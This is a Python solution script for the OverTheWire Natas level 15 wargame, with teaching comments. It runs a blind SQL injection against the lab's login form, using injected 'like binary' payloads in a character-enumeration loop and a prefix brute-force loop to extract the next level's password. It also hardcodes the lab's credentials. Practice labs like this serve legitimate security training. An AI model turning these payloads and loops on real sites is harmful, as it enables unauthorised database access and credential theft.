import requests
import bs4
import re
import string


# configuration for natas15
USERNAME = 'natas15'
PASSWORD = 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'
URL = 'http://natas15.natas.labs.overthewire.org/'
AUTH = requests.auth.HTTPBasicAuth(USERNAME, PASSWORD)


session = requests.Session()
session.auth = AUTH
response = session.get(URL)
div_content = bs4.BeautifulSoup(response.text, 'html.parser').body.find('div', {'id' : 'content'})
print(f'{div_content}\n')


# get the source code
# print(session.get(URL + 'index-source.html').text)
# from the source code, we can see that there is a database table with 2 properties, which are
# username and password
"""
/*
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
*/ 
"""


# explaining the attack
# case 1: this user doesn't exist
# the page will display "this user doesn't exist" when the username is not in the database
data1 = {
    'username' : 'randomusername',
    'submit' : 'submit'
}
response = session.post(URL, data=data1)
div_content = bs4.BeautifulSoup(response.text, 'html.parser').body.find('div', {'id' : 'content'})
print(f'{div_content}\n')
# case 2: this user exists
# the page will only display "this user exists" when the username is in the database
data2 = {
    'username' : 'natas16',
    'submit' : 'submit'
}
response = session.post(URL, data=data2)
div_content = bs4.BeautifulSoup(response.text, 'html.parser').body.find('div', {'id' : 'content'})
print(f'{div_content}\n')
# the attack that we can perform here is a blind SQL injection attack

# example attack
# the following means that the password of natas16 contains the character 'a'
data = {
    'username' : 'natas16" and password like "%a%" #A ',
    'submit' : 'submit'
}
response = session.post(URL, data=data)
div_content = bs4.BeautifulSoup(response.text, 'html.parser').body.find('div', {'id' : 'content'})
print(f'{div_content}\n')


# PART I: get the components of the password
# so far, the password only contains ascii letters and digits
# the following prepares all possible characters in a password
possible_chars = string.ascii_letters + string.digits
# the following will be occupied by all characters contained in the password
password_chars = ""
for char in possible_chars:
    data = {
        # we need to use binary to perform case sensitive query
        'username' : f'natas16" and password like binary "%{char}%" #A ',
        'submit' : 'submit'
    }
    response = session.post(URL, data=data)
    print(f'characters in the password: {password_chars + char}', end='\r')
    if re.search(r'This user exists', response.text):
        password_chars += char
        print(f'characters in the password: {password_chars}', end='\r')
print('\n')


# PART II: constructing the password
# now that we know every character in the password, we can try to build the password from the known characters
password = ""
# note that, so far, the password has been 32 characters long
for i in range(32):
    for char in password_chars:
        data = {
            # we need to use binary to perform case sensitive query
            'username' : f'natas16" and password like binary "{password + char}%" #A ',
            'submit' : 'submit'
        }
        print(f'password: {password + char}', end='\r')
        response = session.post(URL, data=data)
        if re.search(r'This user exists', response.text):
            password += char
            print(f"password: {password}", end='\r')
            # move to the next character
            break
print('\n')


# natas16 password: WaIHEacj63wnNIBROHeqi3p9t0m5nhmh
print(f'natas16 password: {password}')